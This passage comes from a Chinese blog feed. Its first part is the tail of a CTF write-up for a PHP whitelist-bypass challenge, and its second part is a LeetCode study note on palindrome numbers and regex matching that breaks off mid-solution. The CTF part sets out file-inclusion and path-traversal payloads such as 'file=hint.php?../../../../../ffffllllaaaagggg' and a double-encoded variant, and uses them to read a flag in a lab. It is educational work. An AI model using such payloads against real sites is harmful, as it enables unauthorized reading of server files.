class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">    <span class="variable">$page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这里给 <code>$_page</code> 赋了个什么值：</p><p><code>mb_substr()</code> 函数负责获取部分字符串；</p><p><code>mb_strpos()</code> 函数负责查找字符串在另一个字符串中首次出现的位置；</p><p>在 <code>PHP</code> 中，字符串后的 <code>'.'</code> 为并置运算符，表示连接两个字符串；</p><p>因此，<code>mb_strpos</code> 返回的是 <code>$page</code> 字符串中的字符 <code>'?'</code> 之前的所有字符串，又因为字符串末尾置了一个 <code>'?'</code> ，若原字符串中不含 <code>'?'</code> 则会返回原字符串。</p><p><strong>第四个代码块</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重复了第二个代码块的内容，但是这次判断的是 <code>$_page</code> ，若存在于白名单中则返回 <code>true</code>。也可以让他执行。</p><p><strong>第五个</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br></pre></td></tr></table></figure><p><code>urldecode()</code> 函数负责解码 URL 编码的字符串，这里将解码后的代码赋给了 <code>$_page</code> 。</p><p><strong>第六个代码块</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line"><span class="variable">$_page</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这里重复了第三个代码块的内容，但是这次截取的是 <code>$_page</code> 自己的内容。</p><p><strong>最后一部分</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>程序再次检查修改后的 <code>$_page</code> 是否在白名单中，若在，则返回 <code>true</code> 。若不在，则输出 <code>&quot;you can't see it&quot;</code> 并且返回 <code>false</code> 。</p><ul><li><p>也就是说，若要 <code>checkFile()</code> 函数返回 <code>true</code> ，则必须控制 <code>$page</code> 参数不为空且为字符串，然后在三次判断是否在白名单中的任意一次让他存在于白名单中即可。而此时，白名单中只有两个成员：<code>source.php</code> 和 <code>hint.php</code> 。</p></li><li><p>所以 <code>$page</code> 是什么呢？</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br></pre></td></tr></table></figure></li></ul><p>​从这段代码可以看出，<code>$page</code> 就是 <code>$_REQUEST['file']</code> ，而 <code>$_REQUEST</code> 是用于收集HTML表单提交的数据，属于PHP的超级全局变量。总之，他负责接收名为 <code>file</code> 的变量并且进行一次解码。而我们需要做的，就是给 <code>file</code> 赋一个字符串，并且让 <code>checkFile()</code> 函数返回 <code>true</code> 。</p><ul><li>那么 <code>file</code> 的内容需要有什么？</li></ul><p>​在之前我们尝试访问白名单文件时，得到了一个提示：<code>flag in ffffllllaaaagggg</code> ，而我们的最终目的，就是让这个参数被 <code>include</code> 进去。这里利用的其实就是 <strong>文件包含漏洞</strong> ，通过 <code>include</code> 包含并打开 <code>ffffllllaaaagggg</code> 即可。因此给 <code>file</code> 赋的字符串必须为包含文件 <code>ffffllllaaaagggg</code> 的路径名。</p><p>​接下来我们需要让 <code>checkFile()</code> 返回为 <code>true</code> ，由于必须包含 <code>ffffllllaaaagggg</code> ，因此第一个白名单判断肯定无法使用，而第二个 if语句可以。因为第二次判断之前，程序对字符串进行了截取，我们只需保证 <code>?</code> 之前为白名单成员即可。</p><blockquote><p>当然，也可以用第三个if语句，不过因为调用了 <code>urldecode(page)</code> 对连接进行了二次解码，因此后面需要用 <code>%253f</code> （‘?’ 的二次编码）代替白名单元素后面的 <code>?</code> 。</p></blockquote><p>​因此，<code>file</code> 可以取值为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=hint.php?ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>​或者是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=source.php?ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>​但是，由于我们需要通过 <code>include</code> 打开文件，但是我们需要的文件并不一定在当前目录下，因此，如果打开失败，可在文件名前加 <code>../</code> 用来转到上一层目录查找。比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=source.php?../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>​仍无法找到可自行增加 <code>../</code> 继续向上层目录查找即可。</p><ul><li>那么，怎么把参数传到网页呢？</li></ul><p>​通过在 <code>url</code> 后以 <code>?</code> 引导来添加参数，而且不同参数可用 <code>&amp;</code> 分隔。即可以在地址栏输入以下内容则传参成功：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//靶机地址?file=hint.php?ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure><p>​一般用 <code>payload</code> 来表示后面这段参数：<code>file=hint.php?ffffllllaaaagggg</code></p><h3 id="开始夺旗（Flag）">开始夺旗（Flag）</h3><p>​将刚才得到的 <code>payload</code> 输入到浏览器地址栏之后，记得加 <code>?</code> 。可以看到浏览器显示空页面，因为文件并不在当前目录下，因此我们需要添加 <code>../</code> 来继续查找，可能会需要多个。</p><p><img src="005.webp" alt=""></p><p>​在添加五个 <code>../</code> 之后，终于得到了我们的 <code>Flag</code> ！</p><p><img src="006.webp" alt=""></p><p>​所以，最终的 <code>payload</code> 为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>​或者：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=source.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>​当然还有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=source.php%<span class="number">253</span>f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>自此，夺旗成功。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——day 7</title>
      <link href="/posts/540e3d73/"/>
      <url>/posts/540e3d73/</url>
      
        <content type="html"><![CDATA[<h1>LeetCode 刷题笔记——day 7</h1><h2 id="9-回文数"><a href="https://leetcode-cn.com/problems/palindrome-number/">9. 回文数</a></h2><p>难度：简单</p><p>给你一个整数 <code>x</code> ，如果 <code>x</code> 是一个回文整数，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p><p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。例如，<code>121</code> 是回文，而 <code>123</code> 不是。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 121</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x = -121</span><br><span class="line">输出：false</span><br><span class="line">解释：从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 10</span><br><span class="line">输出：false</span><br><span class="line">解释：从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = -101</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>-231 &lt;= x &lt;= 231 - 1</code></li></ul><p>**进阶：**你能不将整数转为字符串来解决这个问题吗？</p><h3 id="我的答案-8">我的答案</h3><blockquote><p><strong>思路</strong></p><p>首先，根据题目来看，负数肯定不会是回文数，所以可以在第一步直接排除，后面直接判断非负数即可。这里将题给数放进了整形数组中（题目的进阶要求为不将整数转为字符串来解决，所以这里转为了整型数组， վ’ᴗ’ ի ），然后依次遍历前半部分同时与后半部分相比较，存在不同则直接输出 <code>false</code> ，剩下的就是回文数了。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; a;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(; x &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">            a.<span class="built_in">push_back</span>(x % <span class="number">10</span>);</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i / <span class="number">2</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j] != a[i - j - <span class="number">1</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>16 ms</strong></p></li><li><p>内存消耗: <strong>9.4 MB</strong></p></li></ul><p>难得写了一个零 bug 的程序而且一遍过，可喜可贺可喜可贺，虽然只是一道简单题……</p><p>不过程序还存在一个问题，整形数组占用的空间反而比字符串要多得多，这里只是实在想不到不用字符串怎么解才使用整型数组……</p><p>接下来还是看看官方给的答案：</p><h3 id="官方答案-9">官方答案</h3><h4 id="反转一半数字">反转一半数字</h4><blockquote><p><strong>思路</strong></p><p>映入脑海的第一个想法是将数字转换为字符串，并检查字符串是否为回文。但是，这需要额外的非常量空间来创建问题描述中所不允许的字符串。</p><p>第二个想法是将数字本身反转，然后将反转后的数字与原始数字进行比较，如果它们是相同的，那么这个数字就是回文。<br>但是，如果反转后的数字大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>int.MAX</mtext></mrow><annotation encoding="application/x-tex">\text{int.MAX}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">int.MAX</span></span></span></span></span>，我们将遇到整数溢出问题。</p><p>按照第二个想法，为了避免数字反转可能导致的溢出问题，为什么不考虑只反转 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>int</mtext></mrow><annotation encoding="application/x-tex">\text{int}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6679em;"></span><span class="mord text"><span class="mord">int</span></span></span></span></span> 数字的一半？毕竟，如果该数字是回文，其后半部分反转后应该与原始数字的前半部分相同。</p><p>例如，输入 1221，我们可以将数字 “1221” 的后半部分从 “21” 反转为 “12”，并将其与前半部分 “12” 进行比较，因为二者相同，我们得知数字 1221 是回文。</p><p><strong>算法</strong></p><p>首先，我们应该处理一些临界情况。所有负数都不可能是回文，例如：-123 不是回文，因为 - 不等于 3。所以我们可以对所有负数返回 false。除了 0 以外，所有个位是 0 的数字不可能是回文，因为最高位不等于 0。所以我们可以对所有大于 0 且个位是 0 的数字返回 false。</p><p>现在，让我们来考虑如何反转后半部分的数字。</p><p>对于数字 1221，如果执行 1221 % 10，我们将得到最后一位数字 1，要得到倒数第二位数字，我们可以先通过除以 10 把最后一位数字从 1221 中移除，1221 / 10 = 122，再求出上一步结果除以 10 的余数，122 % 10 = 2，就可以得到倒数第二位数字。如果我们把最后一位数字乘以 10，再加上倒数第二位数字，1 * 10 + 2 = 12，就得到了我们想要的反转后的数字。如果继续这个过程，我们将得到更多位数的反转数字。</p><p>现在的问题是，我们如何知道反转数字的位数已经达到原始数字位数的一半？</p><p>由于整个过程我们不断将原始数字除以 10，然后给反转后的数字乘上 10，所以，当原始数字小于或等于反转后的数字时，就意味着我们已经处理了一半位数的数字了。</p><p><img src="9_fig1.png" alt=""></p><p>作者：LeetCode-Solution</p></blockquote><p>用 C++ 复现了一遍：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x &lt; <span class="number">0</span> || (x % <span class="number">10</span> == <span class="number">0</span> &amp;&amp; x != <span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x &gt; num) &#123;</span><br><span class="line">            num = num * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x == num || x == num / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>4 ms</strong></p></li><li><p>内存消耗: <strong>5.9 MB</strong></p></li></ul><p>学到了学到了~</p><p>继续练习一下 Java ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x &lt; <span class="number">0</span> || (x % <span class="number">10</span> == <span class="number">0</span> &amp;&amp; x != <span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x &gt; num) &#123;</span><br><span class="line">            num = num * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x == num || x == num / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>4 ms</strong></p></li><li><p>内存消耗: <strong>37.8 MB</strong></p></li></ul><p>对了，代码比较简单，只用到了最基本的语法，所以 Java 和 C++ 的代码是一样的。</p><h2 id="10-正则表达式匹配"><a href="https://leetcode-cn.com/problems/regular-expression-matching/">10. 正则表达式匹配</a></h2><p>难度：困难</p><p>给你一个字符串 <code>s</code> 和一个字符规律 <code>p</code>，请你来实现一个支持 <code>'.'</code> 和 <code>'*'</code> 的正则表达式匹配。</p><ul><li><code>'.'</code> 匹配任意单个字符</li><li><code>'*'</code> 匹配零个或多个前面的那一个元素</li></ul><p>所谓匹配，是要涵盖 <strong>整个</strong> 字符串 <code>s</code>的，而不是部分字符串。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;aa&quot; p = &quot;a&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：&quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;aa&quot; p = &quot;a*&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：因为 &#x27;*&#x27; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &#x27;a&#x27;。因此，字符串 &quot;aa&quot; 可被视为 &#x27;a&#x27; 重复了一次。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;ab&quot; p = &quot;.*&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：&quot;.*&quot; 表示可匹配零个或多个（&#x27;*&#x27;）任意字符（&#x27;.&#x27;）。</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;aab&quot; p = &quot;c*a*b&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：因为 &#x27;*&#x27; 表示零个或多个，这里 &#x27;c&#x27; 为 0 个, &#x27;a&#x27; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。</span><br></pre></td></tr></table></figure><p><strong>示例 5：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;mississippi&quot; p = &quot;mis*is*p*.&quot;</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 20</code></li><li><code>1 &lt;= p.length &lt;= 30</code></li><li><code>s</code> 可能为空，且只包含从 <code>a-z</code> 的小写字母。</li><li><code>p</code> 可能为空，且只包含从 <code>a-z</code> 的小写字母，以及字符 <code>.</code> 和 <code>*</code>。</li><li>保证每次出现字符 <code>*</code> 时，前面都匹配到有效的字符</li></ul><p>很好，所以 <strong>正则表达式</strong> 是什么？</p><blockquote><p>​<strong>正则表达式</strong>，又称规则表达式。（英语：Regular Expression，在代码中常简写为 regex 、regexp 或 RE），计算机科学的一个概念。正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。</p><p>​正则表达式是对字符串（包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为“元字符”））操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。正则表达式是一种文本模式，该模式描述在搜索文本时要匹配的一个或多个字符串。</p><p align="right">—— 百度百科</p></blockquote><p>似懂非懂，附上 <a href="https://tool.oschina.net/uploads/apidocs/jquery/regexp.html">正则表达式手册</a> ，先把题目做了吧。</p><h3 id="我的答案-9">我的答案</h3><blockquote><p><strong>思路</strong></p><p>利用二维数组 <code>a[x][y]</code>，其中 <code>x</code> 和 <code>y</code> 分别表示字符在 <code>字符规律p</code> 以及 <code>字符串s</code> 中的位置序号。数组类型为 <code>bool</code>，若值为 <code>true</code> 则说明 <code>字符串s</code> 前 <code>y</code> 位与 <code>字符规律p</code> 的前 <code>x</code> 位相匹配。</p><p>首先，<code>a[0][0]</code> 为 <code>true</code> ，而 <code>x</code> 或 <code>y</code> 为 <code>0</code> 的其他项为 <code>false</code>，因为 <code>x</code> 与 <code>y</code> 不同时为 <code>0</code> 时不匹配。<strong>但是</strong>，有一种特殊情况，若 <code>y=0</code> 而 <code>字符规律p</code> 的前两位为 <code>X*</code> （X 表示除 <code>*</code> 以外符合条件的任意字符）时，此时相匹配，则 <code>a[2][0]</code> 为 <code>true</code>。而这种情况也会影响到后面 <code>y=0</code> 组的值。因此在循环体中需要添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">a[i][<span class="number">0</span>] = a[i - <span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成以上则确定的二维数组的初始状况，接下来开始分步具体考虑。</p><p>如果 <code>字符规律p</code> 被读取的字符为 <code>'.'</code>，则只需要保证在此之前的两段字符串相匹配即可，即以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[i][j] = a[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>而如果读取的字符为 <code>'小写字母'</code> ，则只需要保证当前位字母相同且之前位都相匹配，即以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[i][j] = ch == s[j - <span class="number">1</span>] &amp;&amp; a[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>最后若读取到的字符为 <code>'*'</code> 时，就需要分两种情况考虑。因为 <code>'*'</code> 可以表示零或多个前一位字符，这里分别考虑表示零和多位时的情况。</p><ul><li><p>表示零位，则保证在 字符<code>'*'</code> 的前方第二位处之前两段字符串匹配即可，即以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[i][j] = a[i - <span class="number">2</span>][j]</span><br></pre></td></tr></table></figure></li><li><p>表示多位，则保证 字符<code>'*'</code> 之前的一位之前两段字符串相匹配即可，特别的，若前位为 <code>'.'</code> ，则不需判断相同以匹配，因为 <code>'.*'</code> 可与任意端字符串相匹配，即以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[i][j] = a[i][j - <span class="number">1</span>] &amp;&amp; (p[i - <span class="number">2</span>] == <span class="string">&#x27;.&#x27;</span> || p[i - <span class="number">2</span>] == s[j - <span class="number">1</span>]);</span><br></pre></td></tr></table></figure></li></ul><p>通过以上步骤，二维数组的最大位 <code>a[p.size()][s.size()]</code> 即为整体匹配的结果。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMatch</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = s.<span class="built_in">size</span>(), n = p.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">bool</span> a[n + <span class="number">1</span>][m + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m; j++) &#123;</span><br><span class="line">                a[i][j] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        a[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> ch = p[i - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                a[i][<span class="number">0</span>] = a[i - <span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(ch == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    a[i][j] = a[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    a[i][j] = a[i - <span class="number">2</span>][j] || a[i][j - <span class="number">1</span>] &amp;&amp; (p[i - <span class="number">2</span>] == <span class="string">&#x27;.&#x27;</span> || p[i - <span class="number">2</span>] == s[j - <span class="number">1</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    a[i][j] = ch == s[j - <span class="number">1</span>] &amp;&amp; a[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> a[n][m];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>4 ms</strong></p></li><li><p>内存消耗: <strong>6.2 MB</strong></p></li></ul><p>第一次自己写这么长的一段题解，主要的原因还是对分析过程还是不算特别熟悉。我并没有用过类似的方法，这道题本来用的一维数组，最终无路可走，能用二维数组分析至此，还是参考了网友的方法。就现阶段来说，这道题目于我实在还是太难了。说来惭愧，计算机专业学生今天第一次接触<strong>正则表达式</strong>。</p><h3 id="官方答案-10">官方答案</h3><h4 id="动态规划-2">动态规划</h4><blockquote><p><strong>思路与算法</strong></p><p>题目中的匹配是一个「逐步匹配」的过程：我们每次从字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 